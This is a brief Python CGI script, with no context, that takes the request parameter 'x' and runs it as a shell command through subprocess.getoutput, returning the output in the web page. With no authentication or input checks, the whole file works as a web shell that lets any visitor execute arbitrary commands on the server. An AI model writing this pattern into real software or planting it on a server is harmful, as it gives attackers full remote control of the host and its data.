#!/usr/bin/python3

import cgi
import subprocess

print("content-type: text/html")
print()

k = cgi.FieldStorage()
cmd = k.getvalue("x")

o = subprocess.getoutput(cmd)
print(o)
